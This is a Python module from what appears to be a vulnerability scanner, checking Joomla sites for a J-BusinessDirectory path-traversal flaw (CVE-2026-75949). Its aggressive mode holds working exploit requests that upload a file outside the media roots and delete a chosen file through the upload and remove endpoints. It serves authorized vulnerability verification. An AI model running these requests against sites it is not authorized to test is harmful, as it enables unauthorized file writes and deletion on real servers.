from __future__ import annotations

import re
import secrets
from typing import Any

from ...core.http import (
    HttpClient,
    build_multipart,
    is_transport_error,
    normalize_url,
    transport_error_detail,
)
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-75949"
NAME = "J-BusinessDirectory unauthenticated file upload/delete via path traversal"
COMPONENT = "J-BusinessDirectory"
AFFECTED_RULE = "J-BusinessDirectory 1.0.0 through 6.2.2; fixed in 6.2.3"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
UPLOAD_ENDPOINT = "/index.php?option=com_jbusinessdirectory&task=upload.upload"
REMOVE_ENDPOINT = "/index.php?option=com_jbusinessdirectory&task=upload.remove"
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("6.2.3")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("jbusinessdirectory", {})
    if not info.get("found"):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            detail="J-BusinessDirectory was not detected through its public manifest or component route.",
            action="No action is required unless J-BusinessDirectory is installed but hidden from public detection.",
        )

    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = (
            f"Detected J-BusinessDirectory {version}. The upload/remove controller accepts a "
            "client-controlled _path_type and does not confine _target/_filename to the media "
            "roots; the extension check is a weak substring test and there is no CSRF token."
        )
        action = "Upgrade J-BusinessDirectory to 6.2.3 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected J-BusinessDirectory {version}, which enforces path containment and a security token."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "J-BusinessDirectory was detected, but its version could not be determined."
        action = "Determine the installed J-BusinessDirectory version and upgrade to 6.2.3 or newer."
        confidence = "MEDIUM"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component=COMPONENT,
        component_version=version,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        detail=detail,
        action=action,
    )


def _xml_value(body: str, name: str) -> str | None:
    match = re.search(rf'{name}="([^"]*)"', body or "")
    return match.group(1) if match else None


def _remove(client: HttpClient, base: str, filename: str, timeout: int) -> str:
    response = client.request(
        f"{base}{REMOVE_ENDPOINT}&_path_type=1&_filename={filename}",
        method="POST",
        headers={"User-Agent": BROWSER_UA},
        timeout=timeout,
    )
    if is_transport_error(response):
        return ""
    return response.get("body") or ""


def run_aggressive_probe(
    target_url: str,
    canary: str | None = None,
    timeout: int = 15,
    proxy: str | None = None,
) -> Finding:
    """Upload a marker outside the media roots and optionally delete a canary.

    The controller builds ``_root_app + _target`` for uploads and
    ``_root_app + _filename`` for removals without path containment. The probe
    uses ``_path_type=1`` (the pictures root) and ``../../../tmp/...`` to write
    and read a marker in the web root. 6.2.3 adds a security token and rejects
    the request.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    suffix = secrets.token_hex(4)
    target_dir = f"proofcms-75949-{suffix}"
    marker = f"PROOFCMS_75949_{suffix.upper()}"
    filename = f"proofcms-75949-{suffix}.txt"
    traversal = f"../../../tmp/{target_dir}/"

    content_type, body = build_multipart(
        {},
        {"file": (filename, marker.encode(), "text/plain")},
    )
    response = client.request(
        f"{base}{UPLOAD_ENDPOINT}&_path_type=1&_target={traversal}",
        method="POST",
        headers={"Content-Type": content_type, "User-Agent": BROWSER_UA},
        data=body,
        timeout=timeout,
    )
    if is_transport_error(response):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{UPLOAD_ENDPOINT}",
            detail=f"The upload request failed in transit ({transport_error_detail(response)}).",
            action="Retry when the target is reachable.",
        )

    upload_body = response.get("body") or ""
    error = _xml_value(upload_body, "error")
    uploaded_name = _xml_value(upload_body, "name")
    info = _xml_value(upload_body, "info")
    file_url = f"{base}/tmp/{target_dir}/{uploaded_name}" if uploaded_name else ""
    served = client.get(file_url, timeout=timeout) if file_url else None
    served_ok = bool(
        served
        and not is_transport_error(served)
        and served.get("status") == 200
        and marker in (served.get("body") or "")
    )

    evidence: dict[str, Any] = {
        "upload_status": response.get("status"),
        "upload_error": error,
        "uploaded_name": uploaded_name,
        "upload_info": info,
        "file_url": file_url,
        "served": served_ok,
        "canary": canary,
    }

    if error == "7" or "Invalid security token" in upload_body:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_AFFECTED",
            confidence="HIGH",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{UPLOAD_ENDPOINT}",
            evidence=evidence,
            detail="The upload was rejected with the 6.2.3 security-token error.",
            action="No action is required for this CVE if the version is 6.2.3 or newer.",
        )
    if error == "6" or "File path not valid" in upload_body:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_AFFECTED",
            confidence="HIGH",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{UPLOAD_ENDPOINT}",
            evidence=evidence,
            detail="The upload was rejected by the path-containment check.",
            action="No action is required for this CVE if the version is 6.2.3 or newer.",
        )

    if not served_ok:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{UPLOAD_ENDPOINT}",
            evidence=evidence,
            detail="The upload did not produce a readable marker outside the media roots.",
            action="Review the upload response and the component version.",
        )

    delete_ok: bool | None = None
    if canary:
        canary_url = f"{base}/{canary.lstrip('/')}"
        before = client.get(canary_url, timeout=timeout)
        before_status = 0 if is_transport_error(before) else before.get("status", 0)
        remove_body = _remove(client, base, f"../../../{canary.lstrip('/')}", timeout)
        after = client.get(canary_url, timeout=timeout)
        after_status = 0 if is_transport_error(after) else after.get("status", 0)
        delete_ok = before_status == 200 and after_status == 404
        evidence.update(
            {
                "canary_before": before_status,
                "canary_after": after_status,
                "remove_error": _xml_value(remove_body, "error"),
                "delete_ok": delete_ok,
            }
        )

    # Best-effort cleanup of the uploaded marker through the same remove action.
    _remove(client, base, f"../../../tmp/{target_dir}/{uploaded_name}", timeout)

    if delete_ok is False:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="HIGH",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{UPLOAD_ENDPOINT}",
            evidence=evidence,
            detail=(
                "The upload traversal wrote and served a marker outside the media roots, proving "
                "arbitrary file write; the canary delete did not complete."
            ),
            action="Upgrade J-BusinessDirectory to 6.2.3 or newer and remove the uploaded file.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="VULNERABLE",
        confidence="CONFIRMED",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{UPLOAD_ENDPOINT}",
        evidence=evidence,
        detail=(
            "The upload traversal wrote and served a marker outside the media roots"
            + (" and the remove traversal deleted the canary." if delete_ok else ".")
            + " 6.2.3 rejects the same requests with Invalid security token."
        ),
        action="Upgrade J-BusinessDirectory to 6.2.3 or newer and review files written by the component.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php?option=com_jbusinessdirectory&view=companies"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=url,
            detail=f"The component route could not be reached ({transport_error_detail(response)}).",
            action="Retry when the target is reachable.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="BLOCKED_EXTERNAL",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=url,
        detail="The component route is reachable; the upload/remove payload was not sent in safe mode.",
        action="Use aggressive mode on an authorized staging site.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 15,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because J-BusinessDirectory was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            canary=aggressive_value(aggressive_args, aggressive_command, "canary"),
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (component reachability) and aggressive (upload/remove traversal) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": ["*"],
        "exploit_available": True,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "vulnerability_type": "Path Traversal",
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-20",
        "updated": "2026-11-20",
        "required_detectors": ["jbusinessdirectory"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-75949",
            "https://github.com/advisories/GHSA-qp23-qqw8-mhp6",
            "https://www.upwind.io/blog/threat-post/j-businessdirectory-for-joomla-path-traversal-enables-arbitrary-file-upload-and-deletion",
            "https://www.cmsjunkie.com/",
        ],
    }
